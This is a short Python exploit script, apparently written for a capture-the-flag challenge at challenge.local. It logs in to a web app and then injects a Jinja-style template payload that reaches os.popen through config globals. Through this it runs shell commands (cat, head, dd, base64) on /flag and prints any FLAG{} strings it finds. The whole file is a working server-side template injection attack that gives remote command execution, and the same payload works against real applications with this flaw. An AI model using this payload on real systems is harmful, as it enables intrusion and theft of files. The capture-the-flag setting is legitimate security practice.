import requests
import re

BASE_URL = "http://challenge.local:8080"
session = requests.Session()

# Login
session.post(f"{BASE_URL}/login", data={"username": "test", "password": "test"})
print("[+] Logged in")

# Execute command via SSTI
def exec_cmd(cmd):
    payload = f"{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}"
    resp = session.get(f"{BASE_URL}/search", params={"q": payload})
    
    # Extract FLAG{} pattern if present
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
    if flags:
        print(f"[!] FLAG FOUND via '{cmd}':")
        for flag in flags:
            print(f"    {flag}")
    
    # Show command and response length
    print(f"[{cmd}] Status: {resp.status_code} | Length: {len(resp.text)}B")
    
    # Show first 500 chars of response for analysis
    if len(resp.text) < 500:
        print(f"Response: {resp.text}")
    else:
        print(f"Response (first 500 chars): {resp.text[:500]}")
    
    return resp

# Try commands
exec_cmd("cat /flag")
exec_cmd("head -n 1 /flag")
exec_cmd("dd if=/flag bs=1 count=50 2>/dev/null")
exec_cmd("base64 /flag")

print("\n[*] Done")

